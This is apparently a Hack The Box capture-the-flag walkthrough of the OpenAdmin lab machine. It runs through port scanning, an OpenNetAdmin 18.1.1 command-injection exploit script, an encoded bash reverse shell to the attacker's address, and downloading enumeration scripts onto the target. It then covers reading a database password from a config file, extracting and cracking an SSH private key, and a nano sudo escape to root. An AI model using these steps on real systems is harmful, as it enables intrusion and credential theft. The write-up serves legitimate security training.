HTB - OpenAdmin

1. `nmap -T4 -p- -A 10.10.10.171`
	```
	Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-08 23:26 EDT
	Warning: 10.10.10.171 giving up on port because retransmission cap hit (6).
	Nmap scan report for 10.10.10.171
	Host is up (0.11s latency).
	Not shown: 47750 closed ports, 17783 filtered ports
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
	|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
	|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
	80/tcp open  http?
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 2888.60 seconds
	```
	Secondary Possible Nmap Command: `nmap -p- -Pn -sV -sC 10.10.10.171`
2. Enumerate HTTP
	1. Go to `http://10.10.10.171` shows default apache page
	2. Directory busting with `dirbuster`: `http://10.10.10.171:80`, go faster, and `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt` password list. Finds `/ona/` and `/music/` (which has a login link that goes to `/ona/`).
		```
		DirBuster 1.0-RC1 - Report
		http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
		Report produced on Sat May 09 00:19:22 EDT 2020
		--------------------------------
		
		http://10.10.10.171:80
		--------------------------------
		Directories found during testing:
		
		Dirs found with a 200 response:
		
		/
		/music/
		/music/img/
		/music/css/
		/music/img/blog/
		/music/js/
		/music/img/playlist/
		/music/img/concept/
		/music/img/songs/
		/ona/
		/music/img/premium/
		/music/img/icons/
		/ona/images/
		/ona/include/
		/ona/modules/
		/ona/images/silk/
		/ona/include/adodb/
		/ona/include/js/
		/ona/include/xajax_suggest/
		/ona/modules/ona/
		/ona/include/xajax_drag/
		/ona/include/adodb5/
		/ona/include/xajax_webwin/
		/ona/include/auth/
		/ona/local/
		/ona/include/xajax/xajax_js/
		/ona/include/xajax/
		/ona/local/config/
		/ona/local/nmap_scans/
		/ona/include/xajax_0.2.4/
		/ona/local/plugins/
		/ona/local/nmap_scans/subnets/
		/ona/plugins/
		/ona/plugins/ona_nmap_scans/
		/ona/include/xajax_0.2.4/xajax_js/
		/ona/include/adodb/datadict/
		/ona/include/adodb/lang/
		/ona/images/silk/icons/
		/ona/include/adodb/drivers/
		/ona/plugins/ona_nmap_scans/sql/
		/ona/include/adodb/xsl/
		/ona/include/adodb5/drivers/
		/ona/include/adodb5/lang/
		/ona/include/adodb5/datadict/
		/ona/include/adodb5/xsl/
		/ona/config/
		
		Dirs found with a 403 response:
		
		/icons/
		/icons/small/
		
		
		--------------------------------
		Files found during testing:
		
		Files found with a 301 responce:
		
		/ona
		
		Files found with a 200 responce:
		
		/music/playlist.html
		/music/index.html
		/music/contact.html
		/music/blog.html
		/music/category.html
		/music/artist.html
		/music/css/font-awesome.min.css
		/music/js/jquery-3.2.1.min.js
		/music/js/WaveSurferInit.js
		/ona/login.php
		/ona/index.php
		/music/css/bootstrap.min.css
		/music/js/bootstrap.min.js
		/music/js/jplayerInit.js
		/music/css/owl.carousel.min.css
		/music/js/jquery.slicknav.min.js
		/music/css/slicknav.min.css
		/music/js/jquery.jplayer.min.js
		/music/js/owl.carousel.min.js
		/music/js/main.js
		/music/css/style.css
		/music/js/wavesurfer.min.js
		/music/js/mixitup.min.js
		/ona/modules/get_module_list.inc.php
		/ona/include/DifferenceEngine.php
		/ona/modules/ipcalc.inc.php
		/ona/modules/mangle.inc.php
		/ona/modules/mysql_purge_logs.inc.php
		/ona/include/adodb_sessions.inc.php
		/ona/modules/report_run.inc.php
		/ona/include/functions_auth.inc.php
		/ona/include/xajax_suggest/suggest.js
		/ona/include/js/global.js
		/ona/include/adodb/README.md
		/ona/modules/sql.inc.php
		/ona/modules/permissions.inc.php
		/ona/include/functions_general.inc.php
		/ona/include/adodb/adodb-active-record.inc.php
		/ona/include/js/bignumber.js
		/ona/include/xajax_suggest/suggest.css
		/ona/include/functions_gui.inc.php
		/ona/include/xajax_drag/drag.js
		/ona/include/adodb/adodb-active-recordx.inc.php
		/ona/include/xajax_webwin/webwinTT.js
		/ona/include/xajax_webwin/webwin.js
		/ona/include/functions_network_map.inc.php
		/ona/include/adodb/LICENSE.md
		/ona/include/adodb/adodb-csvlib.inc.php
		/ona/include/xajax_webwin/webwin.css
		/ona/include/xajax/xajax_js/xajax.js
		/ona/include/adodb/adodb-datadict.inc.php
		/ona/include/auth/local.class.php
		/ona/include/adodb5/LICENSE.md
		/ona/include/html_desktop.inc.php
		/ona/include/adodb5/README.md
		/ona/include/adodb/adodb-error.inc.php
		/ona/include/adodb5/adodb-active-record.inc.php
		/ona/include/xajax/xajax_js/xajax_uncompressed.js
		/ona/include/adodb/adodb-errorhandler.inc.php
		/ona/include/unknown_module_msg.inc.php
		/ona/include/adodb5/adodb-active-recordx.inc.php
		/ona/include/adodb/adodb-errorpear.inc.php
		/ona/include/adodb/adodb-exceptions.inc.php
		/ona/include/xajax/xajax.inc.php
		/ona/include/adodb5/adodb-csvlib.inc.php
		/ona/modules/ona/dns_record.inc.php
		/ona/include/adodb/adodb-iterator.inc.php
		/ona/include/xajax/README.txt
		/ona/include/xajax/xajaxCompress.php
		/ona/local/config/database_settings.inc.php
		/ona/include/adodb5/adodb-datadict.inc.php
		/ona/include/adodb/adodb-lib.inc.php
		/ona/local/config/motd.txt.example
		/ona/include/xajax/LICENSE.txt
		/ona/local/plugins/README
		/ona/include/xajax/xajaxResponse.inc.php
		/ona/include/xajax_0.2.4/README.txt
		/ona/include/xajax_0.2.4/LICENSE.txt
		/ona/include/adodb/adodb-memcache.lib.inc.php
		/ona/local/config/run_installer
		/ona/include/adodb5/adodb-error.inc.php
		/ona/include/adodb/adodb-pager.inc.php
		/ona/include/adodb5/adodb-errorhandler.inc.php
		/ona/include/xajax_0.2.4/xajax.inc.php
		/ona/include/xajax_0.2.4/xajaxCompress.php
		/ona/include/adodb5/adodb-errorpear.inc.php
		/ona/include/adodb/adodb-pear.inc.php
		/ona/modules/ona/host.inc.php
		/ona/plugins/README
		/ona/modules/ona/interface.inc.php
		/ona/include/adodb5/adodb-exceptions.inc.php
		/ona/include/xajax_0.2.4/xajaxResponse.inc.php
		/ona/modules/ona/location.inc.php
		/ona/include/adodb/adodb-perf.inc.php
		/ona/include/adodb5/adodb-iterator.inc.php
		/ona/include/adodb/adodb-php4.inc.php
		/ona/include/adodb/adodb-time.inc.php
		/ona/local/nmap_scans/subnets/nmap.xsl
		/ona/include/adodb5/adodb-lib.inc.php
		/ona/modules/ona/tag.inc.php
		/ona/include/adodb/adodb-xmlschema.inc.php
		/ona/include/adodb/adodb-xmlschema03.inc.php
		/ona/include/adodb5/adodb-memcache.lib.inc.php
		/ona/include/html_style_sheet.inc.php
		/ona/include/xajax_0.2.4/xajax_js/xajax.js
		/ona/include/adodb5/adodb-pager.inc.php
		/ona/include/adodb/adodb.inc.php
		/ona/modules/ona/vlan.inc.php
		/ona/modules/ona/vlan_campus.inc.php
		/ona/include/adodb5/adodb-pear.inc.php
		/ona/plugins/ona_nmap_scans/nmap_scan_cron
		/ona/include/adodb/composer.json
		/ona/plugins/ona_nmap_scans/plugin_info.php
		/ona/include/adodb5/adodb-perf.inc.php
		/ona/plugins/ona_nmap_scans/nmap.xsl
		/ona/include/adodb5/adodb-php4.inc.php
		/ona/include/adodb/pivottable.inc.php
		/ona/include/adodb5/adodb-xmlschema.inc.php
		/ona/include/adodb5/adodb-time.inc.php
		/ona/plugins/ona_nmap_scans/report.inc.php
		/ona/include/adodb5/adodb-xmlschema03.inc.php
		/ona/include/adodb/rsfilter.inc.php
		/ona/plugins/ona_nmap_scans/report_item.inc.php
		/ona/include/xajax_0.2.4/xajax_js/xajax_uncompressed.js
		/ona/include/adodb/server.php
		/ona/include/adodb/lang/adodb-ar.inc.php
		/ona/include/adodb/datadict/datadict-access.inc.php
		/ona/include/adodb/toexport.inc.php
		/ona/include/adodb5/adodb.inc.php
		/ona/include/adodb/datadict/datadict-db2.inc.php
		/ona/include/adodb/lang/adodb-bg.inc.php
		/ona/include/adodb/tohtml.inc.php
		/ona/include/adodb/lang/adodb-ca.inc.php
		/ona/include/adodb/datadict/datadict-generic.inc.php
		/ona/include/adodb/lang/adodb-cn.inc.php
		/ona/include/adodb/lang/adodb-cz.inc.php
		/ona/include/adodb/xmlschema.dtd
		/ona/include/adodb/lang/adodb-da.inc.php
		/ona/include/adodb/datadict/datadict-ibase.inc.php
		/ona/include/adodb5/composer.json
		/ona/include/adodb/lang/adodb-de.inc.php
		/ona/include/adodb/xmlschema03.dtd
		/ona/include/adodb5/pivottable.inc.php
		/ona/include/adodb/lang/adodb-en.inc.php
		/ona/plugins/ona_nmap_scans/sql/check_last_response.sql
		/ona/include/adodb/datadict/datadict-informix.inc.php
		/ona/include/adodb5/rsfilter.inc.php
		/ona/include/adodb/lang/adodb-eo.inc.php
		/ona/include/adodb/datadict/datadict-mssql.inc.php
		/ona/include/adodb/lang/adodb-es.inc.php
		/ona/include/adodb/lang/adodb-fa.inc.php
		/ona/include/adodb/datadict/datadict-mysql.inc.php
		/ona/plugins/ona_nmap_scans/sql/nmap_subnets.sql
		/ona/include/adodb/lang/adodb-fr.inc.php
		/ona/include/adodb/datadict/datadict-mssqlnative.inc.php
		/ona/include/adodb/lang/adodb-hu.inc.php
		/ona/include/adodb/lang/adodb-it.inc.php
		/ona/include/adodb/datadict/datadict-postgres.inc.php
		/ona/include/adodb/xsl/convert-0.1-0.2.xsl
		/ona/include/adodb/xsl/convert-0.1-0.3.xsl
		/ona/include/adodb5/toexport.inc.php
		/ona/include/adodb5/server.php
		/ona/include/adodb5/lang/adodb-ar.inc.php
		/ona/include/adodb5/tohtml.inc.php
		/ona/include/adodb/datadict/datadict-sapdb.inc.php
		/ona/include/adodb5/datadict/datadict-access.inc.php
		/ona/include/adodb/lang/adodb-nl.inc.php
		/ona/include/adodb5/datadict/datadict-db2.inc.php
		/ona/include/adodb/lang/adodb-pl.inc.php
		/ona/include/adodb/xsl/convert-0.2-0.1.xsl
		/ona/include/adodb/datadict/datadict-sqlite.inc.php
		/ona/include/adodb5/lang/adodb-bg.inc.php
		/ona/include/adodb5/xmlschema.dtd
		/ona/include/adodb/lang/adodb-pt-br.inc.php
		/ona/include/adodb5/lang/adodb-ca.inc.php
		/ona/include/adodb/datadict/datadict-sybase.inc.php
		/ona/include/adodb5/datadict/datadict-generic.inc.php
		/ona/include/adodb5/lang/adodb-cn.inc.php
		/ona/include/adodb/lang/adodb-ro.inc.php
		/ona/include/adodb/xsl/remove-0.2.xsl
		/ona/include/adodb5/datadict/datadict-ibase.inc.php
		/ona/include/adodb5/lang/adodb-cz.inc.php
		/ona/include/adodb5/xmlschema03.dtd
		/ona/include/adodb/lang/adodb-ru.inc.php
		/ona/include/adodb/xsl/remove-0.3.xsl
		/ona/include/adodb5/lang/adodb-da.inc.php
		/ona/include/adodb5/datadict/datadict-informix.inc.php
		/ona/include/adodb/xsl/convert-0.2-0.3.xsl
		/ona/include/adodb5/datadict/datadict-mssql.inc.php
		/ona/include/adodb5/lang/adodb-de.inc.php
		/ona/include/adodb/datadict/datadict-oci8.inc.php
		/ona/include/adodb/lang/adodb-sv.inc.php
		/ona/include/adodb5/datadict/datadict-mssqlnative.inc.php
		/ona/include/adodb/lang/adodb-th.inc.php
		/ona/include/adodb5/lang/adodb-en.inc.php
		/ona/include/adodb/lang/adodb-uk.inc.php
		/ona/include/adodb5/lang/adodb-es.inc.php
		/ona/include/adodb5/datadict/datadict-oci8.inc.php
		/ona/include/adodb5/lang/adodb-fa.inc.php
		/ona/include/adodb5/datadict/datadict-postgres.inc.php
		/ona/include/adodb5/xsl/convert-0.1-0.2.xsl
		/ona/include/adodb5/datadict/datadict-sapdb.inc.php
		/ona/include/adodb5/lang/adodb-hu.inc.php
		/ona/include/adodb5/xsl/convert-0.1-0.3.xsl
		/ona/include/adodb5/xsl/convert-0.2-0.1.xsl
		/ona/include/adodb5/lang/adodb-it.inc.php
		/ona/include/adodb5/lang/adodb-fr.inc.php
		/ona/include/adodb5/datadict/datadict-sqlite.inc.php
		/ona/include/adodb5/xsl/convert-0.2-0.3.xsl
		/ona/include/adodb5/lang/adodb-nl.inc.php
		/ona/include/adodb5/datadict/datadict-sybase.inc.php
		/ona/include/adodb5/lang/adodb-pl.inc.php
		/ona/include/adodb5/xsl/remove-0.3.xsl
		/ona/include/adodb5/xsl/remove-0.2.xsl
		/ona/include/adodb5/lang/adodb-ro.inc.php
		/ona/include/adodb5/lang/adodb-ru.inc.php
		/ona/include/adodb5/lang/adodb-sv.inc.php
		/ona/include/adodb5/lang/adodb-th.inc.php
		/ona/include/adodb5/lang/adodb-pt-br.inc.php
		/ona/include/adodb5/lang/adodb-uk.inc.php
		/ona/plugins/ona_nmap_scans/sql/nmap_subnets_only_yes.sql
		/ona/include/adodb5/datadict/datadict-mysql.inc.php
		/ona/include/adodb5/lang/adodb-eo.inc.php
		/ona/logout.php
		/ona/config/auth_ldap.config.php
		/ona/shell.php
		
		Files found with a 500 responce:
		
		/ona/include/xajax_drag/drag.inc.php
		/ona/include/xajax_suggest/suggest.inc.php
		/ona/modules/ona/block.inc.php
		/ona/include/functions_db.inc.php
		/ona/modules/ona/dhcp_server.inc.php
		/ona/include/xajax_setup.inc.php
		/ona/modules/ona/domain.inc.php
		/ona/modules/ona/domain_server.inc.php
		/ona/include/auth/ldap.class.php
		/ona/modules/ona/configuration.inc.php
		/ona/include/xajax_webwin/webwin.inc.php
		/ona/modules/ona/custom_attribute.inc.php
		/ona/modules/ona/message.inc.php
		/ona/modules/ona/subnet.inc.php
		/ona/modules/ona/dhcp_entry.inc.php
		/ona/modules/ona/dhcp_failover.inc.php
		/ona/modules/ona/dhcp_pool.inc.php
		/ona/plugins/ona_nmap_scans/install.php
		/ona/plugins/ona_nmap_scans/ona_nmap_scans.inc.php
		/ona/include/adodb/datadict/datadict-firebird.inc.php
		/ona/include/adodb5/datadict/datadict-firebird.inc.php
		/ona/config/config.inc.php
		
		
		--------------------------------
		```
		![Screenshot-20200509000509-1226x432.png](./resources/d313d186a2cf43538031c27912670cba.png)
		
	3. Search for `opennetadmin v18.1.1 exploit` finds [OpenNetAdmin 18.1.1 - Remote Code Execution](https://www.exploit-db.com/exploits/47691) and [OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)](https://www.exploit-db.com/exploits/47772) and [Rapid7](https://www.rapid7.com/db/modules/exploit/unix/webapp/opennetadmin_ping_cmd_injection)
	4. Metasploit
		```
		sudo msfconsole
		use exploit/unix/webapp/opennetadmin_ping_cmd_injection
		set rhosts 10.10.10.171
		set lhost tun0
		set lport 56762
		set payload linux/x86/meterpreter_reverse_tcp
		run
		```
	5. Manual (Better by far)
		Get exploit:
		```
		searchsploit -m exploits/php/webapps/47691.sh && chmod +x 47691.sh
		dos2unix 47691.sh
		```
		
		Exploit Script:
		```
		#!/bin/bash

		URL="${1}"
		while true;do
		 echo -n "$ "; read cmd
		 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
		done
		```
		
		Run exploit:
		```
		./47691.sh http://10.10.10.171/ona/login.php
		```
		
		The script runs an infinite bash loop taking commands and printing the output. The exploit adds an echo before and after the command the user runs and then uses sed to cut out the command output and ignore the rest.
		
		So since a reverse shell is what we want, lets modify the command to create one with bash:
		```
		curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.61%2F42548%200%3E%261'&xajaxargs[]=ping" "http://10.10.10.171/ona/login.php"
		```
		To create the above command, `bash -c 'bash -i >& /dev/tcp/10.10.14.61/42548 0>&'1` was encoded for URLs by [URLencoder](https://www.urlencoder.org/) and placed in the command area. The `-c` argument to bash is necessary so bash parses the decoded command and not the URL encoded version. 
3. Lateral Movement
	1. Linux Enumeration
		1. [`LinEnum.sh`](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
			On Attacker:
			```
			wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
			sudo python3 -m http.server 80
			```
			
			On Target: 
			```
			wget http://10.10.14.61/LinEnum.sh
			chmod +x LinEnum.sh
			./LinEnum.sh -r report -e /tmp/ -t
			```
		2. [`linuxprivchecker.py`](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)
			On Attacker:
			```
			wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
			sudo python3 -m http.server 80
			```
			
			On Target: 
			```
			wget http://10.10.14.61/linuxprivchecker.py
			chmod +x linuxprivchecker.py
			./LinEnum.sh -r report -e /tmp/ -t
			```
		3. [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
			On Attacker:
			```
			wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
			sudo python3 -m http.server 80
			```
			
			On Target: 
			```
			wget http://10.10.14.61/linpeas.sh
			chmod +x linpeas.sh
			./linpeas.sh -a 2>&1 | tee linpeas_report.txt
			```
			Info about `2>&1` and `tee`: https://stackoverflow.com/questions/418896/how-to-redirect-output-to-a-file-and-stdout
			
			
			Users Found:
			```
			uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
			uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
			```
			
	2. Switch from `www-data` to `jimmy`
		1. Search `/var/www/html` for `passwd`: `grep -lR passwd ./`
			```
			./ona/plugins/ona_nmap_scans/install.php
			./ona/LinEnum.sh
			./ona/include/functions_db.inc.php
			./ona/.htaccess.example
			./ona/report-09-05-20
			./ona/local/config/database_settings.inc.php
			./ona/winc/user_edit.inc.php
			./ona/winc/tooltips.inc.php
			```
		2. `cat ./ona/local/config/database_settings.inc.php`
			```
			<?php
			$ona_contexts=array (
			  'DEFAULT' => 
			  array (
			    'databases' => 
			    array (
			      0 => 
			      array (
			        'db_type' => 'mysqli',
			        'db_host' => 'localhost',
			        'db_login' => 'ona_sys',
			        'db_passwd' => 'n1nj4W4rri0R!',
			        'db_database' => 'ona_default',
			        'db_debug' => false,
			      ),
			    ),
			    'description' => 'Default data context',
			    'context_color' => '#D3DBFF',
			  ),
			);
			
			?>
			```
			Password: `n1nj4W4rri0R!`
	3. `jimmy` to `joanna`: `ssh jimmy@10.10.10.171` with password `n1nj4W4rri0R!` successful.
		1. Run LinPEAS again to find the following:
			```
			[+] Interesting GROUP writable files (not in Home)
			[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
			  Group internal:
			/var/www/internal                                                                                                                                                            
			/var/www/internal/main.php
			/var/www/internal/logout.php
			/var/www/internal/index.php
			[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
			/var/www/internal/index.php:                  $_SESSION['username'] = 'jimmy';
			/var/www/internal/linpeas.sh:    for f in $tomcat; do grep "username=" $f 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
			/var/www/internal/main.php://session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 

			[+] Looking for md5/sha1/sha256/sha512 hashes inside files (limit 50)
			/var/www/internal/index.php:'00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1'
			```
			
		2. See if the files in this directory are an active site by listing `/etc/apache2/sites-enabled`. `cat internal.conf`:
			```
			Listen 127.0.0.1:52846

			<VirtualHost 127.0.0.1:52846>
			    ServerName internal.openadmin.htb
			    DocumentRoot /var/www/internal
			
			<IfModule mpm_itk_module>
			AssignUserID joanna joanna
			</IfModule>
			
			    ErrorLog ${APACHE_LOG_DIR}/error.log
			    CustomLog ${APACHE_LOG_DIR}/access.log combined
			
			</VirtualHost>
			```
			Result: The site is running on `localhost:52846` as joanna.
		3. Method 1
			1. `cat main.php`
				```
				<?php session_start(); 
				//$_SESSION['username']="joanna";
				if (!isset($_SESSION['username'])) { header("Location: /index.php"); }; 
				# Open Admin Trusted
				# OpenAdmin
				$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
				echo "<pre>$output</pre>";
				?>
				<html>
				<h3>Don't forget your "ninja" password</h3>
				Click here to logout <a href="logout.php" tite = "Logout">Session
				</html>
				```
			2. `cat index.php` includes:
				```
				if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
	                  $_SESSION['username'] = 'jimmy';
	                  header("Location: /main.php");
	              } else {
	                  $msg = 'Wrong username or password.';
	              }
				```
				Result: This file is not necessary since `main.php` can be accessed directly.
			3. `curl 127.0.0.1:52846/main.php` gives us:
				```
				-----BEGIN RSA PRIVATE KEY-----
				Proc-Type: 4,ENCRYPTED
				DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
				
				kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
				ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
				ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
				6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
				ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
				y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
				9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
				piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
				/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
				40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
				fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
				9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
				X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
				S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
				FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
				Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
				RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
				uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
				1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
				XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
				yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
				+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
				qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
				z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
				K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
				-----END RSA PRIVATE KEY-----
				```
				The key is encrypted so lets bruteforce with `johntheripper`
				
		4. Method 2
			1. Reverse shell in `/var/www/internal`
		5. `john` bruteforce RSA key:
			```
			/usr/share/john/ssh2john.py key > hash
			sudo john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
			```
			Result: Key is `bloodninjas`
	4. `joanna` to `root`: `chmod 600 key` and `ssh joanna@10.10.10.171 -i key`
		1. `sudo -l`
			```
			User joanna may run the following commands on openadmin:
    			(ALL) NOPASSWD: /bin/nano /opt/priv
			```
		2. `cat user.txt`: **User Flag:** `c9b2cf07d40807e62af62660f0c81b5f`
		3. Search for nano on [GTFOBins](https://gtfobins.github.io/gtfobins/nano/)
			```
			nano
			^R^X
			reset; sh 1>&0 2>&0
			```
		4. Switch to tty: `SHELL=/bin/bash script -q /dev/null`
		5. `cat /root/root.txt`: **Root Flag:** `2f907ed450b361b2c2bf4e8795d5b561`
		








